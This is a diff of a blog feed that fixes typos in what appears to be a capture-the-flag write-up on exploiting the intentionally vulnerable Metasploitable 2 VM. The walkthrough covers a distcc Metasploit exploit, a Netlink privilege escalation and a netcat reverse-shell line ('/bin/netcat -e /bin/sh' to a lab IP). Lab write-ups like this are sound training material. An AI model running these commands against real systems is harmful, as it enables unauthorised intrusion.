@@ -10,7 +10,7 @@
     
     
     <item>
-      <title>CTF 1: Metasploitable 2</title>
+      <title>CTF: Metasploitable 2</title>
       <link>https://www.haroonakram.co.uk/offsec/metasploitable2/</link>
       <pubDate>Sun, 03 Dec 2023 09:19:02 +0200</pubDate>
       
@@ -94,7 +94,7 @@ vulnerability. I used the <strong>&ndash;script-args</strong> option for us to e
 <p><img src="/images/Metasploitable_2/msf_distcc_msf_options.jpg" alt="msf_distcc_msf_options.jpg"></p>
 <h3 id="exploitation">Exploitation</h3>
 <p>This exploit also has many payload options, the one I am using is called <strong>cmd/unix/bind_ruby</strong>. Once the payload is set, we can now hit exploit.</p>
-<p>Upon exploiting, we have a reverse shell towards teh system, however, this is only a deamon shell with restrictive privileges. Lets Escalate!!</p>
+<p>Upon exploiting, we have a reverse shell towards the system, however, this is only a deamon shell with restrictive privileges. Lets Escalate!!</p>
 <p><img src="/images/Metasploitable_2/msf_distcc_msf_setpayload.jpg" alt="msf_distcc_msf_setpayload.jpg"></p>
 <h3 id="local-privilege-escalation">Local Privilege Escalation</h3>
 <p>So now that we have reverse shell access, its time to escalate ourselves to root. To do this, I am going to make use of a <strong>C</strong> script found locally in Kali
@@ -120,7 +120,7 @@ cat run
 #!/bin/sh
 /bin/netcat -e /bin/sh 192.168.10.40 5555
 </code></pre>
-<p>Now using <strong>gcc</strong>, we shall compile the code, I saved the output as <strong>pivesc</strong> using the <strong>-o</strong> option for clarity&rsquo;s sake.</p>
+<p>Now using <strong>gcc</strong>, we shall compile the code, I saved the output as <strong>privesc</strong> using the <strong>-o</strong> option for clarity&rsquo;s sake.</p>
 <p>I used the <strong>chmod</strong> command to give it full Read, Write &amp; Execute permission too.</p>
 <p><img src="/images/Metasploitable_2/msf_distcc_msf_bash_full.jpg" alt="msf_distcc_msf_bash_full.jpg"></p>
 <p><strong>Netlink</strong> is used to establish a network communication between the kernel &amp; user-space processes to transfer information.</p>
